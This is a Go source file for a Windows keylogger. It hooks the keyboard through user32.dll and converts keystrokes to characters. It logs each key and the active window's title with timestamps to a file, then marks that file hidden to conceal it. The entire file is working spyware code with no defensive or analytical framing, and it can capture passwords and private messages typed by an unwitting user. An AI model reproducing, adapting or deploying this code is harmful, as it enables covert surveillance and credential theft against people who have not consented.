package main

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"time"

	"syscall"
	"unsafe"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
)

var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetKeyState         = mod.NewProc("GetKeyState")
	procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState    = mod.NewProc("GetKeyboardState")
	procGetForegroundWindow = mod.NewProc("GetForegroundWindow")
	procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
	procGetWindowText       = mod.NewProc("GetWindowTextW")
	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
)

type (
	HANDLE uintptr
	HWND   HANDLE
)

// Gets length of text of window text by HWND
func GetWindowTextLength(hwnd HWND) int {
	ret, _, _ := procGetWindowTextLength.Call(
		uintptr(hwnd))

	return int(ret)
}

// Gets text of window text by HWND
func GetWindowText(hwnd HWND) string {
	textLen := GetWindowTextLength(hwnd) + 1

	buf := make([]uint16, textLen)
	procGetWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	return syscall.UTF16ToString(buf)
}

// Gets current foreground window
func GetForegroundWindow() uintptr {
	hwnd, _, _ := procGetForegroundWindow.Call()
	return hwnd
}

// Runs the keylogger
func Run(key_out chan rune, window_out chan string) error {
	keyboardChan := make(chan types.KeyboardEvent, 1024)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("start capturing keyboard input")

	for {
		select {
		case <-signalChan:
			fmt.Println("Received shutdown signal")
			return nil
		case k := <-keyboardChan:
			if hwnd := GetForegroundWindow(); hwnd != 0 {
				if k.Message == types.WM_KEYDOWN {
					key_out <- VKCodeToAscii(k)
					window_out <- GetWindowText(HWND(hwnd))
				}
			}
		}
	}
}

// Converts from Virtual-Keycode to Ascii rune
func VKCodeToAscii(k types.KeyboardEvent) rune {
	if k.VKCode == 0x0D {
		// Return a special rune or character for Enter key
		return '\n'
	}
	var buffer []uint16 = make([]uint16, 256)
	var keyState []byte = make([]byte, 256)

	n := 10
	n |= (1 << 2)

	procGetKeyState.Call(uintptr(k.VKCode))

	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))
	r1, _, _ := procGetKeyboardLayout.Call(0)

	procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n), r1)

	if len(syscall.UTF16ToString(buffer)) > 0 {
		return []rune(syscall.UTF16ToString(buffer))[0]
	}
	return rune(0)
}

func main() {
	// Channels for passing keystrokes and window titles
	keyOut := make(chan rune, 1024)
	windowOut := make(chan string, 1024)

	exePath, err := os.Executable()
	if err != nil {
		fmt.Println(err)
		return
	}

	// Get the absolute path
	exePath, err = filepath.Abs(exePath)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Get the directory of the executable
	exeDir := filepath.Dir(exePath)

	dirName := "data"

	// Check if the directory exists
	if _, err := os.Stat(dirName); os.IsNotExist(err) {
		// Directory does not exist, create it
		err := os.Mkdir(dirName, 0755)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		// Directory already exists
		log.Printf("Directory '%s' already exists\n", dirName)
	}

	file, err := os.OpenFile(exeDir+"\\data\\keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	// file, err = os.OpenFile("keylog.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening log file: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()
	// Run the keylogger in a separate goroutine hello
	setHiddenAttribute(file.Name())
	go func() {
		err := Run(keyOut, windowOut)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
			os.Exit(1)
		}
	}()

	// Listen for keystrokes and window titles
	for {
		select {
		case key := <-keyOut:
			// fmt.Sprintf("Key: %c\n", key)
			t := time.Now()
			file.WriteString(fmt.Sprintf("%s Key: %c\n", t, key))
		case window := <-windowOut:
			t := time.Now()
			// fmt.Printf("Window: %s\n", window)
			file.WriteString(fmt.Sprintf("%s Window: %s\n", t, window))
		}
	}
}

func setHiddenAttribute(filePath string) error {
	pFilePath, err := syscall.UTF16PtrFromString(filePath)
	if err != nil {
		return err
	}
	return windows.SetFileAttributes(pFilePath, windows.FILE_ATTRIBUTE_HIDDEN)
}
